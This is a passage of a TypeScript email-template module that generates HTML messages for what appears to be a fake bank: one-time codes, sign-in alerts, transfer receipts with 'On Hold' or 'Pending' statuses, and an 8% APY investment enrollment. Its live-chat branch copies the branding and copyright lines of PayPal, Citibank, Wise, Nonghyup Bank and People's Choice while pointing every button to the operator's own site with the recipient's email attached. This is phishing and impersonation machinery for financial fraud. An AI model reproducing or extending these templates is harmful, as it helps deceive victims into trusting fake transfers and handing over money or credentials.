
import { APP_CONFIG } from '../config';
import { t } from './i18n';

const fmt$ = (v: any) => {
    if (v == null || v === '') return v || '0';
    const s = String(v);
    if (/[\d],[\d]{3}/.test(s)) return s;
    const m = s.match(/^([^0-9.-]*)([0-9]+(?:\.[0-9]+)?)(.*)$/);
    if (!m) return s;
    const n = parseFloat(m[2]);
    if (isNaN(n)) return s;
    const dec = m[2].split('.')[1];
    const opts: any = {};
    if (dec) { opts.minimumFractionDigits = dec.length; opts.maximumFractionDigits = dec.length; }
    return m[1] + n.toLocaleString('en-US', opts) + m[3];
};

import { getWiseEmailTemplate } from './wiseEmailTemplate';
import { getCitiBankEmailTemplate } from './citiBankEmailTemplate';
import { getPeopleChoiceEmailTemplate } from './peopleChoiceEmailTemplate';
import { getNonghyupEmailTemplate } from './nonghyupEmailTemplate';
import { getBankNameFromSource, getParentTypeFromSource } from './customTemplates';

export const getEmailTemplate = (type: 'login' | 'transaction' | 'account' | 'card' | 'investment' | 'welcome' | 'otp' | 'high_yield_enrollment' | 'paypal' | 'wise' | 'citibank' | 'peoplechoice' | 'nonghyup' | 'live_chat_reply', data: any, lang?: string) => {
   let subject = '';
   let content = '';

   const header = `
    <!DOCTYPE html>
    <html>
    <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>${APP_CONFIG.BANK_NAME} ${t('notification', lang)}</title>
    <style>
      body { margin: 0; padding: 0; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; background-color: #f1f5f9; color: #334155; -webkit-font-smoothing: antialiased; }
      .container { max-width: 600px; margin: 0 auto; background-color: #ffffff; border-radius: 8px; overflow: hidden; box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1); border: 1px solid #e2e8f0; }
      .header { background-color: #2563eb; padding: 16px; text-align: center; background-image: linear-gradient(135deg, #2563eb 0%, #1d4ed8 100%); }
      .brand { color: #ffffff; font-size: 24px; font-weight: 800; letter-spacing: -0.5px; text-decoration: none; display: inline-block; text-shadow: 0 1px 2px rgba(0,0,0,0.1); }
      .content { padding: 20px; }
      .footer { background-color: #f8fafc; padding: 16px; text-align: center; font-size: 11px; color: #94a3b8; border-top: 1px solid #e2e8f0; }
      .btn { display: inline-block; padding: 12px 28px; background-color: #2563eb; color: #ffffff; text-decoration: none; border-radius: 6px; font-weight: 600; font-size: 15px; margin-top: 10px; box-shadow: 0 2px 4px rgba(37, 99, 235, 0.2); transition: background-color 0.2s; }
      .btn:hover { background-color: #1d4ed8; }
      .info-table { width: 100%; border-collapse: separate; border-spacing: 0; margin: 10px 0; border: 1px solid #e2e8f0; border-radius: 8px; overflow: hidden; }
      .info-row td { padding: 10px 16px; border-bottom: 1px solid #e2e8f0; background-color: #ffffff; }
      .info-row:last-child td { border-bottom: none; }
      .info-row:nth-child(even) td { background-color: #f8fafc; }
      .info-label { color: #64748b; font-size: 13px; font-weight: 600; width: 40%; }
      .info-value { color: #0f172a; font-weight: 600; font-size: 13px; text-align: right; }
      .amount-box { text-align: center; margin: 10px 0; padding: 16px; background-color: #f8fafc; border-radius: 12px; border: 1px solid #e2e8f0; }
      .amount-val { font-size: 32px; font-weight: 800; color: #0f172a; margin: 0; letter-spacing: -1px; }
      .amount-label { font-size: 11px; text-transform: uppercase; color: #64748b; margin-top: 4px; letter-spacing: 1px; font-weight: 700; }
      .headline { color: #0f172a; margin: 0 0 8px; font-size: 20px; text-align: center; font-weight: 800; letter-spacing: -0.5px; }
      .text-center { text-align: center; }
      .text-muted { color: #64748b; font-size: 14px; line-height: 1.5; margin: 0; }
      .alert-box { background-color: #fef2f2; border: 1px solid #fecaca; border-radius: 8px; padding: 12px; margin: 10px 0; text-align: center; }
      .alert-text { color: #991b1b; font-size: 13px; font-weight: 500; margin: 0; line-height: 1.4; }
      .highlight-box { background-color: #eff6ff; border: 1px solid #dbeafe; border-radius: 8px; padding: 16px; margin: 10px 0; text-align: center; }
      .highlight-label { color: #1e40af; font-size: 11px; text-transform: uppercase; font-weight: 700; letter-spacing: 1px; margin-bottom: 4px; display: block; }
      .highlight-value { color: #1e3a8a; font-size: 18px; font-weight: 700; margin: 0; }
      a { color: #2563eb; text-decoration: none; font-weight: 600; }
      a:hover { text-decoration: underline; }
      .code-box { background-color: #f8fafc; border: 1px solid #cbd5e1; border-radius: 12px; padding: 24px; margin: 24px 0; text-align: center; }
      .code { font-family: monospace; font-size: 32px; font-weight: 800; color: #0f172a; letter-spacing: 4px; display: block; }
    </style>
    </head>
    <body>
      <div style="display:none;font-size:1px;color:#f1f5f9;line-height:1px;max-height:0px;max-width:0px;opacity:0;overflow:hidden;">Ref-${data.ref_id || Date.now()}</div>
      <div class="container">
        <div class="header">
           <a href="${APP_CONFIG.SITE_URL}" class="brand">${APP_CONFIG.BANK_NAME.toUpperCase()}</a>
        </div>
  `;

   const footer = `
        <div class="footer">
           <p style="margin: 0 0 8px;">&copy; ${new Date().getFullYear()} ${APP_CONFIG.BANK_NAME}. ${t('all_rights_reserved', lang)}</p>
           <p style="margin: 0;">
             <a href="${APP_CONFIG.SITE_URL}/#privacy">${t('privacy', lang)}</a> &bull; 
             <a href="${APP_CONFIG.SITE_URL}/#support">${t('support', lang)}</a>
           </p>
        </div>
      </div>
    </body>
    </html>
  `;

   switch (type) {
      case 'otp':
         subject = t('verify_your_identity', lang);
         content = `
          ${header}
          <div class="content">
             <h2 class="headline">${t('verify_your_identity', lang)} 🔐</h2>
             <p class="text-center text-muted" style="margin-bottom: 10px;">
               ${t('use_code_below', lang)}
             </p>
             
             <div class="code-box">
                <span class="code">${data.otp}</span>
             </div>
  
             <p class="text-center text-muted" style="font-size: 13px;">${t('code_expire_10min', lang)}</p>
             <p class="text-center text-muted" style="font-size: 13px; margin-top: 20px;">
               ${t('if_didnt_request_ignore', lang)}
             </p>
          </div>
          ${footer}`;
         break;

      case 'welcome':
         subject = `${t('welcome_to', lang)} ${APP_CONFIG.BANK_NAME}`;
         content = `
        ${header}
        <div class="content">
           <h2 class="headline">${t('welcome_future_banking', lang)} 🚀</h2>
           <p class="text-center text-muted" style="margin-bottom: 20px;">
             ${t('hello_there', lang)} <strong>${data.user_name}</strong>
           </p>
           
           <div class="highlight-box">
              <p class="text-muted" style="color: #1e40af; font-weight: 600;">${t('account_activated', lang)}</p>
           </div>

           <p class="text-muted" style="font-size: 14px; margin-top: 20px;">
             ${t('account_activated', lang)}
           </p>
           <ul style="color: #64748b; font-size: 13px; line-height: 2; margin-top: 10px;">
             <li>${t('instant_global_transfers', lang)}</li>
             <li>${t('crypto_high_yield', lang)}</li>
             <li>${t('ai_finance_insights', lang)}</li>
             <li>${t('dedicated_support', lang)}</li>
           </ul>
           
           <div class="text-center" style="margin-top: 30px;">
              <a href="${APP_CONFIG.SITE_URL}" class="btn">${t('go_to_dashboard', lang)}</a>
           </div>
        </div>
        ${footer}`;
         break;

      case 'login':
         subject = t('new_signin_detected', lang);
         content = `
        ${header}
        <div class="content">
           <h2 class="headline">${t('new_signin_detected', lang)} 🔐</h2>
           <p class="text-center text-muted" style="margin-bottom: 10px;">
             ${t('noticed_new_login', lang)}
           </p>
           
           <table class="info-table">
              <tr class="info-row">
                 <td class="info-label">${t('account', lang)}</td>
                 <td class="info-value">${data.user_name}</td>
              </tr>
              <tr class="info-row">
                 <td class="info-label">${t('time', lang)}</td>
                 <td class="info-value">${data.time}</td>
              </tr>
              <tr class="info-row">
                 <td class="info-label">${t('device', lang)}</td>
                 <td class="info-value">${t('web_client', lang)}</td>
              </tr>
              <tr class="info-row">
                 <td class="info-label">${t('country', lang)}</td>
                 <td class="info-value">${data.location || t('unknown', lang)}</td>
              </tr>
              <tr class="info-row">
                 <td class="info-label">${t('ip_address', lang)}</td>
                 <td class="info-value">${data.ip || t('unknown', lang)}</td>
              </tr>
           </table>

           <div class="alert-box">
             <p class="alert-text">
               ${t('if_not_you_secure', lang)}
             </p>
           </div>
           
           <div class="text-center">
              <a href="${APP_CONFIG.SITE_URL}/#settings" class="btn">${t('secure_my_account', lang)}</a>
           </div>
        </div>
        ${footer}`;
         break;

      case 'transaction':
         const txStatus = data.status || 'Success';
         const isTxPending = txStatus === 'Pending';
         const isTxFailed = txStatus === 'Failed';
         const isTxOnHold = txStatus === 'On Hold';
         const isTxProcessing = txStatus === 'Processing';
         subject = isTxFailed ? t('tx_failed', lang) : isTxPending ? t('tx_pending', lang) : isTxOnHold ? t('tx_on_hold', lang) : isTxProcessing ? t('tx_processing', lang) : t('tx_receipt', lang);
         const statusColor = isTxFailed ? '#dc2626' : isTxPending ? '#f59e0b' : isTxOnHold || isTxProcessing ? '#2563eb' : '#10b981';
         const statusIcon = isTxFailed ? '❌' : isTxPending ? '⏳' : isTxOnHold ? '⏸️' : isTxProcessing ? '⏳' : '✅';
         const statusText = isTxFailed ? t('payment_failed', lang) : isTxPending ? t('payment_pending', lang) : isTxOnHold ? t('payment_pending', lang) : isTxProcessing ? t('payment_pending', lang) : t('payment_successful', lang);
         const statusDesc = isTxFailed ? t('tx_desc_failed', lang) : isTxPending ? t('tx_desc_pending', lang) : isTxOnHold ? t('tx_desc_onhold', lang) : isTxProcessing ? t('tx_desc_processing', lang) : t('tx_desc_success', lang);
         const txDisplayStatus = isTxFailed ? t('status_failed', lang) : isTxPending ? t('status_pending', lang) : isTxOnHold ? t('status_on_hold', lang) : isTxProcessing ? t('status_processing', lang) : t('status_success', lang);

         content = `
        ${header}
        <div class="content">
           <h2 class="headline">${statusText} ${statusIcon}</h2>
           <p class="text-center text-muted" style="font-size: 14px;">${statusDesc}</p>
           
           <div class="amount-box">
              <h1 class="amount-val">${fmt$(data.amount)}</h1>
              <p class="amount-label">${t('usd_amount', lang)}</p>
           </div>

           <table class="info-table">
              <tr class="info-row">
                 <td class="info-label">${t('recipient', lang)}</td>
                 <td class="info-value">${data.to_name}</td>
              </tr>
              <tr class="info-row">
                 <td class="info-label">${t('date', lang)}</td>
                 <td class="info-value">${data.date}</td>
              </tr>
              <tr class="info-row">
                 <td class="info-label">${t('reference_id', lang)}</td>
                 <td class="info-value" style="font-family: monospace; letter-spacing: 0.5px;">${data.ref_id}</td>
              </tr>
              <tr class="info-row">
                 <td class="info-label">${t('status', lang)}</td>
                 <td class="info-value" style="color: ${statusColor}">${txDisplayStatus}</td>
              </tr>
           </table>
           
           <p class="text-center text-muted" style="font-size: 13px; margin-top: 10px;">
             ${t('questions_ref_id', lang)}
           </p>
           <div class="text-center">
              <a href="${APP_CONFIG.SITE_URL}/#transactions" style="color: #2563eb; text-decoration: none; font-size: 14px; font-weight: 600; display: inline-block; margin-top: 10px;">${t('view_details', lang)} &rarr;</a>
           </div>
        </div>
        ${footer}`;
         break;

      case 'account':
         subject = t('profile_updated', lang);
         content = `
        ${header}
        <div class="content">
           <h2 class="headline">${t('profile_updated', lang)} 🛡️</h2>
           <p class="text-muted">${t('hello_there', lang)} <strong>${data.user_name}</strong>,</p>
           <p class="text-muted" style="margin-top: 8px;">${t('account_changes_confirm', lang)}</p>
           
           <div class="highlight-box">
              <span class="highlight-label">${t('update_type', lang)}</span>
              <p class="highlight-value">${data.update_type}</p>
           </div>

           <p class="text-muted" style="font-size: 14px;">${t('if_not_you_changes', lang)}</p>
           
           <div class="text-center">
              <a href="${APP_CONFIG.SITE_URL}/#contact-us" class="btn">${t('contact_support', lang)}</a>
           </div>
        </div>
        ${footer}`;
         break;

      case 'card':
         subject = t('card_activity_alert', lang);
         content = `
        ${header}
        <div class="content">
           <h2 class="headline">${t('card_activity_alert', lang)} 💳</h2>
           <p class="text-muted">${t('hello_there', lang)} <strong>${data.user_name}</strong>,</p>
           <p class="text-muted" style="margin-top: 8px;">${t('activity_on_card', lang).replace('{last4}', data.card_last4)}</p>
           
           <div class="highlight-box" style="background-color: #f8fafc; border-color: #e2e8f0;">
              <span class="highlight-label" style="color: #64748b;">${t('action_taken', lang)}</span>
              <p class="highlight-value" style="color: #0f172a;">${data.action}</p>
           </div>

           <p class="text-muted" style="font-size: 14px;">${t('manage_card_desc', lang)}</p>
           
           <div class="text-center">
              <a href="${APP_CONFIG.SITE_URL}/#wallet" class="btn">${t('go_to_wallet', lang)}</a>
           </div>
        </div>
        ${footer}`;
         break;

      case 'investment':
         subject = t('order_executed', lang);
         content = `
          ${header}
          <div class="content">
             <h2 class="headline">${t('order_executed', lang)} 📈</h2>
             <p class="text-center text-muted" style="margin-top: 4px;">${t('investment_order_filled', lang)}</p>
             
             <div class="amount-box">
                <h1 class="amount-val">${data.symbol}</h1>
                <p class="amount-label">${data.action}</p>
             </div>
  
             <table class="info-table">
                <tr class="info-row">
                   <td class="info-label">${t('total_value', lang)}</td>
                   <td class="info-value">$${fmt$(data.amount)}</td>
                </tr>
                <tr class="info-row">
                   <td class="info-label">${t('execution_price', lang)}</td>
                   <td class="info-value">$${fmt$(data.price)}</td>
                </tr>
                <tr class="info-row">
                   <td class="info-label">${t('date', lang)}</td>
                   <td class="info-value">${new Date().toLocaleDateString()}</td>
                </tr>
             </table>
             
             <p class="text-center text-muted" style="font-size: 13px; margin-top: 10px;">${t('track_portfolio', lang)}</p>
             <div class="text-center">
                <a href="${APP_CONFIG.SITE_URL}/#investments" class="btn">${t('view_portfolio', lang)}</a>
             </div>
          </div>
          ${footer}`;
         break;

      case 'high_yield_enrollment':
         subject = t('investment_account_activated', lang);
         content = `
          ${header}
          <div class="content">
             <h2 class="headline">${t('investment_account_activated', lang)}</h2>
             <p class="text-center text-muted" style="margin-bottom: 20px;">
               ${t('congratulations_hy', lang)}
             </p>
             
             <div class="highlight-box" style="background-color: #eef2ff; border-color: #c7d2fe;">
                <span class="highlight-label" style="color: #4338ca;">${t('current_rate', lang)}</span>
                <p class="highlight-value" style="color: #312e81;">8.00% APY</p>
             </div>

             ${data.amount ? `
             <div class="amount-box" style="background-color: #f1f5f9; border-color: #e2e8f0; margin-top: 10px;">
                <h1 class="amount-val" style="font-size: 24px;">${fmt$(data.amount)}</h1>
                <p class="amount-label">${t('initial_locked_deposit', lang)}</p>
             </div>
             ` : ''}
  
             <p class="text-muted" style="font-size: 14px; margin-top: 20px; text-align: center;">
               ${t('earning_more', lang)}
             </p>
             
             <div class="text-center" style="margin-top: 30px;">
                <a href="${APP_CONFIG.SITE_URL}" class="btn" style="background-color: #4f46e5;">${t('go_to_dashboard', lang)}</a>
             </div>
          </div>
          ${footer}`;
         break;

      case 'wise':
         subject = t('tx_receipt', lang);
         content = getWiseEmailTemplate(data, lang);
         break;

      case 'citibank':
         subject = t('tx_receipt', lang);
         content = getCitiBankEmailTemplate(data, lang);
         break;

      case 'peoplechoice':
         subject = t('tx_receipt', lang);
         content = getPeopleChoiceEmailTemplate(data, lang);
         break;

      case 'nonghyup':
         subject = t('tx_receipt', lang);
         content = getNonghyupEmailTemplate(data, lang);
         break;

      case 'live_chat_reply': {
         const bankSrc = data.source_template || '';
         const bankSender = getBankNameFromSource(bankSrc);
         const parentType = getParentTypeFromSource(bankSrc) || bankSrc;
         subject = parentType === 'paypal'
            ? t('action_required_unread', lang)
            : `${bankSender} — ${t('support_replied', lang)}`;

         // Branded wrappers per bank
         let replyHeader = header;
         let replyFooter = footer;
         let btnColor = '#2563eb';

         if (parentType === 'nonghyup') {
            replyHeader = `<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Nonghyup Bank</title><style>body{margin:0;padding:0;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;background:#f1f5f9;color:#334155;-webkit-font-smoothing:antialiased;}.container{max-width:600px;margin:0 auto;background:#fff;border-radius:8px;overflow:hidden;box-shadow:0 4px 6px -1px rgba(0,0,0,0.1);border:1px solid #e2e8f0;}.header{background:#0033A0;padding:16px;text-align:center;}.brand{color:#fff;font-size:22px;font-weight:800;letter-spacing:-0.5px;text-decoration:none;display:inline-block;}.content{padding:20px;}.footer{background:#f8fafc;padding:16px;text-align:center;font-size:11px;color:#94a3b8;border-top:1px solid #e2e8f0;}.btn{display:inline-block;padding:12px 28px;background:#0033A0;color:#fff;text-decoration:none;border-radius:6px;font-weight:600;font-size:15px;margin-top:10px;box-shadow:0 2px 4px rgba(0,51,160,0.2);}.headline{color:#0f172a;margin:0 0 8px;font-size:20px;text-align:center;font-weight:800;letter-spacing:-0.5px;}.text-center{text-align:center;}.text-muted{color:#64748b;font-size:14px;line-height:1.5;margin:0;}.highlight-box{background:#eff6ff;border:1px solid #dbeafe;border-radius:8px;padding:16px;margin:10px 0;text-align:center;}.highlight-label{color:#1e40af;font-size:11px;text-transform:uppercase;font-weight:700;letter-spacing:1px;margin-bottom:4px;display:block;}.highlight-value{color:#1e3a8a;font-size:18px;font-weight:700;margin:0;}a{color:#0033A0;text-decoration:none;font-weight:600;}a:hover{text-decoration:underline;}</style></head><body><div style="display:none;font-size:1px;color:#f1f5f9;line-height:1px;max-height:0px;max-width:0px;opacity:0;overflow:hidden;">Ref-${data.ref_id || Date.now()}</div><div class="container"><div class="header"><span class="brand">NONGHYUP BANK</span></div>`;
            replyFooter = `<div class="footer"><p style="margin:0 0 8px;">&copy; ${new Date().getFullYear()} Nonghyup Bank. ${t('all_rights_reserved', lang)}</p><p style="margin:0;"><a href="${APP_CONFIG.SITE_URL}/#privacy">${t('privacy', lang)}</a> &bull; <a href="${APP_CONFIG.SITE_URL}/#support">${t('support', lang)}</a></p></div></div></body></html>`;
            btnColor = '#0033A0';
         } else if (parentType === 'paypal') {
            replyHeader = `<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>PayPal</title><style>body{margin:0;padding:0;background:#f5f7fa;font-family:"Helvetica Neue",Helvetica,Arial,sans-serif;-webkit-font-smoothing:antialiased;}.wrapper{max-width:600px;margin:0 auto;background:#f5f7fa;padding:20px 0 10px 0;}.header{text-align:center;padding:15px 0 25px 0;}.logo{width:74px;height:auto;display:block;margin:0 auto;}.box{background:#fff;padding:40px;margin:0 20px;border-radius:8px;box-shadow:0 1px 3px rgba(0,0,0,0.05);}.headline{color:#000;margin:0 0 12px;font-size:22px;text-align:center;font-weight:700;}.text-center{text-align:center;}.text-muted{color:#6c7378;font-size:14px;line-height:1.6;margin:0;}.highlight-box{background:#f8fafc;border:1px solid #e2e8f0;border-radius:8px;padding:16px;margin:10px 0;text-align:center;}.highlight-label{color:#0070ba;font-size:11px;text-transform:uppercase;font-weight:700;letter-spacing:1px;margin-bottom:4px;display:block;}.highlight-value{color:#0f172a;font-size:16px;font-weight:600;margin:0;font-style:italic;}.btn{display:inline-block;padding:14px 45px;background:#000;color:#fff;text-decoration:none;border-radius:25px;font-weight:bold;font-size:15px;margin-top:20px;min-width:140px;text-align:center;}.footer{text-align:center;padding:25px 0;font-size:11px;color:#6c7378;}</style></head><body><div style="display:none;font-size:1px;color:#f5f7fa;line-height:1px;max-height:0px;max-width:0px;opacity:0;overflow:hidden;">Ref-${data.ref_id || Date.now()}</div><div class="wrapper"><div class="header"><img src="https://upload.wikimedia.org/wikipedia/commons/b/b7/PayPal_Logo_Icon_2014.svg" alt="PayPal" class="logo" width="74"></div><div class="box">`;
            replyFooter = `</div><div class="footer"><p style="margin:0 0 8px;">${t('paypal_fraud_prevention', lang)}</p><p style="margin:0;">&copy; 1999-${new Date().getFullYear()} PayPal, Inc. ${t('all_rights_reserved', lang)}</p></div></div></body></html>`;
            btnColor = '#000000';
         } else if (parentType === 'wise') {
            replyHeader = `<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Wise</title><style>body{margin:0;padding:0;background:#f1f5f9;font-family:"Helvetica Neue",Helvetica,Arial,sans-serif;-webkit-font-smoothing:antialiased;}.container{max-width:600px;margin:0 auto;background:#fff;border-radius:8px;overflow:hidden;box-shadow:0 4px 6px -1px rgba(0,0,0,0.1);border:1px solid #e2e8f0;}.header{background:#2E7D32;padding:16px;text-align:center;}.brand{color:#fff;font-size:22px;font-weight:800;letter-spacing:-0.5px;text-decoration:none;display:inline-block;font-family:'Courier Prime','Courier New',Courier,monospace;}.content{padding:20px;}.footer{background:#f8fafc;padding:16px;text-align:center;font-size:11px;color:#94a3b8;border-top:1px solid #e2e8f0;}.btn{display:inline-block;padding:12px 28px;background:#2E7D32;color:#fff;text-decoration:none;border-radius:6px;font-weight:600;font-size:15px;margin-top:10px;box-shadow:0 2px 4px rgba(46,125,50,0.2);}.headline{color:#0f172a;margin:0 0 8px;font-size:20px;text-align:center;font-weight:800;letter-spacing:-0.5px;}.text-center{text-align:center;}.text-muted{color:#64748b;font-size:14px;line-height:1.5;margin:0;}.highlight-box{background:#f0fdf4;border:1px solid #bbf7d0;border-radius:8px;padding:16px;margin:10px 0;text-align:center;}.highlight-label{color:#166534;font-size:11px;text-transform:uppercase;font-weight:700;letter-spacing:1px;margin-bottom:4px;display:block;}.highlight-value{color:#14532d;font-size:16px;font-weight:600;margin:0;font-style:italic;}a{color:#2E7D32;text-decoration:none;font-weight:600;}a:hover{text-decoration:underline;}</style></head><body><div style="display:none;font-size:1px;color:#f1f5f9;line-height:1px;max-height:0px;max-width:0px;opacity:0;overflow:hidden;">Ref-${data.ref_id || Date.now()}</div><div class="container"><div class="header"><span class="brand">WISE</span></div>`;
            replyFooter = `<div class="footer"><p style="margin:0 0 8px;">&copy; ${new Date().getFullYear()} Wise. ${t('all_rights_reserved', lang)}</p><p style="margin:0;"><a href="${APP_CONFIG.SITE_URL}/#privacy">${t('privacy', lang)}</a> &bull; <a href="${APP_CONFIG.SITE_URL}/#support">${t('support', lang)}</a></p></div></div></body></html>`;
            btnColor = '#2E7D32';
         } else if (parentType === 'citibank') {
            replyHeader = `<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Citibank</title><style>body{margin:0;padding:0;background:#f1f5f9;font-family:"Helvetica Neue",Helvetica,Arial,sans-serif;-webkit-font-smoothing:antialiased;}.container{max-width:600px;margin:0 auto;background:#fff;border-radius:8px;overflow:hidden;box-shadow:0 4px 6px -1px rgba(0,0,0,0.1);border:1px solid #e2e8f0;}.header{background:#003B70;padding:16px;text-align:center;}.brand{color:#fff;font-size:22px;font-weight:800;letter-spacing:-0.5px;text-decoration:none;display:inline-block;}.content{padding:20px;}.footer{background:#f8fafc;padding:16px;text-align:center;font-size:11px;color:#94a3b8;border-top:1px solid #e2e8f0;}.btn{display:inline-block;padding:12px 28px;background:#003B70;color:#fff;text-decoration:none;border-radius:6px;font-weight:600;font-size:15px;margin-top:10px;box-shadow:0 2px 4px rgba(0,59,112,0.2);}.headline{color:#0f172a;margin:0 0 8px;font-size:20px;text-align:center;font-weight:800;letter-spacing:-0.5px;}.text-center{text-align:center;}.text-muted{color:#64748b;font-size:14px;line-height:1.5;margin:0;}.highlight-box{background:#eff6ff;border:1px solid #dbeafe;border-radius:8px;padding:16px;margin:10px 0;text-align:center;}.highlight-label{color:#1e40af;font-size:11px;text-transform:uppercase;font-weight:700;letter-spacing:1px;margin-bottom:4px;display:block;}.highlight-value{color:#1e3a8a;font-size:16px;font-weight:600;margin:0;font-style:italic;}a{color:#003B70;text-decoration:none;font-weight:600;}a:hover{text-decoration:underline;}</style></head><body><div style="display:none;font-size:1px;color:#f1f5f9;line-height:1px;max-height:0px;max-width:0px;opacity:0;overflow:hidden;">Ref-${data.ref_id || Date.now()}</div><div class="container"><div class="header"><span class="brand">CITIBANK</span></div>`;
            replyFooter = `<div class="footer"><p style="margin:0 0 8px;">&copy; ${new Date().getFullYear()} Citibank N.A. ${t('all_rights_reserved', lang)} ${t('member_fdic', lang)}.</p><p style="margin:0;"><a href="${APP_CONFIG.SITE_URL}/#privacy">${t('privacy', lang)}</a> &bull; <a href="${APP_CONFIG.SITE_URL}/#support">${t('support', lang)}</a></p></div></div></body></html>`;
            btnColor = '#003B70';
         } else if (parentType === 'peoplechoice') {
            replyHeader = `<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>People's Choice</title><style>body{margin:0;padding:0;background:#f1f5f9;font-family:"Helvetica Neue",Helvetica,Arial,sans-serif;-webkit-font-smoothing:antialiased;}.container{max-width:600px;margin:0 auto;background:#fff;border-radius:8px;overflow:hidden;box-shadow:0 4px 6px -1px rgba(0,0,0,0.1);border:1px solid #e2e8f0;}.header{background:#D32F2F;padding:16px;text-align:center;}.brand{color:#fff;font-size:22px;font-weight:800;letter-spacing:-0.5px;text-decoration:none;display:inline-block;}.content{padding:20px;}.footer{background:#f8fafc;padding:16px;text-align:center;font-size:11px;color:#94a3b8;border-top:1px solid #e2e8f0;}.btn{display:inline-block;padding:12px 28px;background:#D32F2F;color:#fff;text-decoration:none;border-radius:6px;font-weight:600;font-size:15px;margin-top:10px;box-shadow:0 2px 4px rgba(211,47,47,0.2);}.headline{color:#0f172a;margin:0 0 8px;font-size:20px;text-align:center;font-weight:800;letter-spacing:-0.5px;}.text-center{text-align:center;}.text-muted{color:#64748b;font-size:14px;line-height:1.5;margin:0;}.highlight-box{background:#fef2f2;border:1px solid #fecaca;border-radius:8px;padding:16px;margin:10px 0;text-align:center;}.highlight-label{color:#991b1b;font-size:11px;text-transform:uppercase;font-weight:700;letter-spacing:1px;margin-bottom:4px;display:block;}.highlight-value{color:#7f1d1d;font-size:16px;font-weight:600;margin:0;font-style:italic;}a{color:#D32F2F;text-decoration:none;font-weight:600;}a:hover{text-decoration:underline;}</style></head><body><div style="display:none;font-size:1px;color:#f1f5f9;line-height:1px;max-height:0px;max-width:0px;opacity:0;overflow:hidden;">Ref-${data.ref_id || Date.now()}</div><div class="container"><div class="header"><span class="brand">PEOPLE'S CHOICE</span></div>`;
            replyFooter = `<div class="footer"><p style="margin:0 0 8px;">&copy; ${new Date().getFullYear()} People's Choice. ${t('all_rights_reserved', lang)}.</p><p style="margin:0;"><a href="${APP_CONFIG.SITE_URL}/#privacy">${t('privacy', lang)}</a> &bull; <a href="${APP_CONFIG.SITE_URL}/#support">${t('support', lang)}</a></p></div></div></body></html>`;
            btnColor = '#D32F2F';
         }

         // PayPal-specific live chat reply content
         const paypalChatContent = parentType === 'paypal' ? `
          <div class="box">
             <h2 class="headline">${t('action_required_unread', lang)}</h2>
             <p class="text-center text-muted" style="margin-bottom: 16px;">
               ${t('hello_there', lang)} <strong>${data.user_name || t('there', lang)}</strong>, ${t('unread_paypal_transfer', lang)}
             </p>
             <div class="highlight-box" style="background:#f0f7ff;border:1px solid #d0e3ff;">
                <span class="highlight-label" style="color:#0070ba;">${t('unread_message_from_support', lang)}</span>
                <p class="highlight-value" style="font-size: 14px; line-height: 1.4; color:#003087;">"${data.reply_text || t('unread_paypal_transfer', lang)}"</p>
             </div>
             <p class="text-center text-muted" style="font-size: 13px; margin-top: 16px;">
               ${t('review_message_confirm', lang)}
             </p>
             <div class="text-center" style="margin-top: 24px;">
                <a href="${data.chat_url || APP_CONFIG.SITE_URL + '/?livechat=true&email=' + encodeURIComponent(data.user_email || '')}" class="btn" style="background-color: ${btnColor};">${t('view_message_confirm', lang)}</a>
             </div>
             <p class="text-center text-muted" style="font-size: 11px; margin-top: 20px; color: #6c7378;">
               ${t('need_help', lang)} <a href="${APP_CONFIG.SITE_URL}/?livechat=true&email=${encodeURIComponent(data.user_email || '')}" style="color:#0070ba;">${t('continue_live_chat', lang)}</a>
             </p>
          </div>
         ` : `
          <div class="content">
             <h2 class="headline">${t('support_replied', lang)} 💬</h2>
             <p class="text-center text-muted" style="margin-bottom: 10px;">
               ${t('hello_there', lang)} <strong>${data.user_name || t('there', lang)}</strong>, ${t('support_replied_desc', lang)}
             </p>
             <div class="highlight-box">
                <span class="highlight-label">${t('latest_reply', lang)}</span>
                <p class="highlight-value" style="font-size: 14px; line-height: 1.4;">"${data.reply_text || t('new_message_support', lang)}"</p>
             </div>
             <p class="text-center text-muted" style="font-size: 13px; margin-top: 20px;">
               ${t('click_button_chat', lang)}
             </p>
             <div class="text-center" style="margin-top: 20px;">
                <a href="${data.chat_url || APP_CONFIG.SITE_URL + '/?livechat=true&email=' + encodeURIComponent(data.user_email || '')}" class="btn" style="background-color: ${btnColor};">${t('view_reply_continue', lang)}</a>
             </div>
             <p class="text-center text-muted" style="font-size: 11px; margin-top: 20px; color: #94a3b8;">
               ${t('button_doesnt_work', lang)}<br>
               <a href="${data.chat_url || APP_CONFIG.SITE_URL + '/?livechat=true&email=' + encodeURIComponent(data.user_email || '')}" style="font-size: 11px;">${data.chat_url || APP_CONFIG.SITE_URL + '/?livechat=true&email=' + encodeURIComponent(data.user_email || '')}</a>
             </p>
          </div>
         `;

         content = `${replyHeader}${paypalChatContent}${replyFooter}`;
         break;
      }

      case 'paypal':
         const ppStatus = data.status || 'Success';
         const isPpFailed = ppStatus === 'Failed';
         const isPpPending = ppStatus === 'Pending';
         const isPpOnHold = ppStatus === 'On Hold';
         const isPpProcessing = ppStatus === 'Processing';
         subject = isPpFailed ? t('paypal_payment_failed', lang) : t('paypal_payment_received', lang);
         const ppDisplayStatus = isPpFailed ? t('status_failed', lang) : isPpPending ? t('status_pending', lang) : isPpOnHold ? t('status_on_hold', lang) : isPpProcessing ? t('status_processing', lang) : t('status_success', lang);
         content = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PayPal</title>
</head>
<body style="margin: 0; padding: 0; background-color: #f5f7fa; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; -webkit-font-smoothing: antialiased;">
